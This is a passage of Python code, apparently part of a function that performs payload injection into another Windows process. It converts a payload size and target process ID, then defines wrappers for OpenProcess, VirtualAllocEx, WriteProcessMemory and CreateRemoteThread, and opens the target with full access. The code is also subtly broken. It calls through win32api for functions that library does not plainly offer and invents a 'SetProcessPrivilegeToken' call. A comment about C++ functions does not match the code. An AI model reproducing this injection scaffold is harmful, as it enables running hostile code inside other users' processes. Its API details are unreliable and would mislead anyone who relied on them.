    payload_size_in_bytes = ctypes.c_ulong(payload_size_in_bytes)
    target_process_id = ctypes.c_ulong(target_process_id)

    # Define the function signatures in Python
    def OpenProcess(access, bInherit, dwProcessId):
        return win32api.OpenProcess(access, bInherit, dwProcessId)

    def VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect):
        return win32api.VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect)

    def SetProcessPrivilegeToken(dwPrivilege):
        return win32api.SetProcessPrivilegeToken(dwPrivilege)

    def WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, dwSize, lpNumberOfBytesWritten):
        return win32api.WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, dwSize, lpNumberOfBytesWritten)

    def CreateRemoteThread(hProcess, lpStartAddress, dwFlags, lpParameter, dwThreadId):
        return win32api.CreateRemoteThread(hProcess, lpStartAddress, dwFlags, lpParameter, dwThreadId)

    # Call the C++ functions using Python's ctypes
    hHandle = OpenProcess(win32con.PROCESS_ALL_ACCESS, False, target_process_id)
    if not hHandle:
